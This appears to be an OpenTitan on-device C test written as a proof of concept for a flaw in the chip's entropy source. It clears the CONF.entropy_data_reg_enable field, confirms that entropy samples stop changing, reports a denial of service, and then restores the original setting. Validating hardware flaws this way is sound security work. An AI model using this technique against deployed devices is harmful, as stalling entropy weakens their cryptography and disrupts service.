#include "sw/device/lib/testing/test_framework/ottf_main.h"
#include "sw/device/lib/testing/test_framework/check.h"
#include "sw/device/lib/base/mmio.h"
#include "sw/device/lib/base/bitfield.h"
#include "sw/device/lib/runtime/log.h"
#include "hw/top_earlgrey/sw/autogen/top_earlgrey.h"
#include "entropy_src_regs.h"

OTTF_DEFINE_TEST_CONFIG();

// Simple busy wait to give a small delay between MMIO polls.
static void short_delay(void) {
  for (volatile int i = 0; i < 10000; ++i) {
    __asm__ volatile("nop");
  }
}

// Poll the entropy data register and report whether the value changes within
// `tries` attempts. If it changes, the changed value is returned via out_val.
static bool entropy_samples_changing(mmio_region_t base, ptrdiff_t offset,
                                     int tries, uint32_t *out_val) {
  uint32_t last = mmio_region_read32(base, offset);
  for (int i = 0; i < tries; ++i) {
    short_delay();
    uint32_t v = mmio_region_read32(base, offset);
    if (v != last) {
      *out_val = v;
      return true;
    }
  }
  *out_val = last;
  return false;
}

bool test_main(void) {
  LOG_INFO("Starting entropy ingestion gating POC test");

  mmio_region_t es = mmio_region_from_addr(TOP_EARLGREY_ENTROPY_SRC_BASE_ADDR);

  // The test uses these register offsets and bitfield macros provided by the
  // auto-generated entropy_src_regs.h header (made available by
  // //hw/top:entropy_src_c_regs in the BUILD deps).
  const ptrdiff_t entropy_data_reg_offset = ENTROPY_SRC_ENTROPY_DATA_REG_OFFSET;
  const ptrdiff_t conf_reg_offset = ENTROPY_SRC_CONF_REG_OFFSET;

  // Field description for the CONF.entropy_data_reg_enable field. We rely on
  // the reggen-provided MASK and OFFSET macros.
  bitfield_field32_t entropy_data_reg_en_field = {
      .mask = ENTROPY_SRC_CONF_ENTROPY_DATA_REG_ENABLE_MASK,
      .index = ENTROPY_SRC_CONF_ENTROPY_DATA_REG_ENABLE_OFFSET,
  };

  // First, check that the entropy source is producing changing samples.
  uint32_t sample_before = 0;
  LOG_INFO("Checking for active entropy samples (precondition)");
  bool changed = entropy_samples_changing(es, entropy_data_reg_offset, 200, &sample_before);
  CHECK(changed, "No changing entropy samples observed. Ensure ENTROPY_SRC is enabled by ROM or test setup.");
  LOG_INFO("Observed changing entropy sample: 0x%08x", sample_before);

  // Read current CONF register and extract the entropy_data_reg_enable field.
  uint32_t conf = mmio_region_read32(es, conf_reg_offset);
  uint32_t orig_field = bitfield_field32_read(conf, entropy_data_reg_en_field);
  LOG_INFO("Original CONF.entropy_data_reg_enable = 0x%08x", orig_field);

  // Ensure the field is non-zero so ingestion is allowed (make it 1 if it was 0).
  if (orig_field == 0) {
    LOG_INFO("Original field was zero; setting to 1 to allow ingestion for the test");
    uint32_t new_conf = bitfield_field32_write(conf, entropy_data_reg_en_field, 1);
    mmio_region_write32(es, conf_reg_offset, new_conf);
    // Give some time for the change to propagate.
    short_delay();
    // Re-check that entropy samples are changing.
    uint32_t tmp;
    bool ok = entropy_samples_changing(es, entropy_data_reg_offset, 200, &tmp);
    CHECK(ok, "Entropy did not become active after setting entropy_data_reg_enable to non-zero");
    LOG_INFO("Entropy active after enabling field, sample 0x%08x", tmp);
    // Update local copy of conf and orig_field to reflect what we wrote.
    conf = mmio_region_read32(es, conf_reg_offset);
    orig_field = bitfield_field32_read(conf, entropy_data_reg_en_field);
  }

  // Now trigger the vulnerable gating: write zero into the entropy_data_reg_enable
  // field. The RTL erroneously uses a simple (q != '0) check on the raw register
  // value for the ingestion datapath, so writing 0 is expected to suppress
  // ingestion even when the RNG is otherwise enabled.
  LOG_INFO("Writing zero to CONF.entropy_data_reg_enable to trigger ingestion gate");
  uint32_t conf_zero = bitfield_field32_write(conf, entropy_data_reg_en_field, 0);
  mmio_region_write32(es, conf_reg_offset, conf_zero);

  // After clearing the field, entropy should stop changing (DoS). Poll to make
  // sure the sample does NOT change for a window of attempts.
  uint32_t sample_after = 0;
  bool changed_after = entropy_samples_changing(es, entropy_data_reg_offset, 200, &sample_after);
  CHECK(!changed_after, "Entropy samples continued to change after clearing entropy_data_reg_enable - gating not observed");

  LOG_INFO("Entropy samples stopped changing after clearing the field (sample remained 0x%08x). DoS demonstrated.", sample_after);

  // Restore original configuration to avoid leaving hardware in an altered state.
  LOG_INFO("Restoring original CONF.entropy_data_reg_enable = 0x%08x", orig_field);
  uint32_t conf_restore = bitfield_field32_write(conf, entropy_data_reg_en_field, orig_field);
  mmio_region_write32(es, conf_reg_offset, conf_restore);

  LOG_INFO("Test completed");
  return true;
}
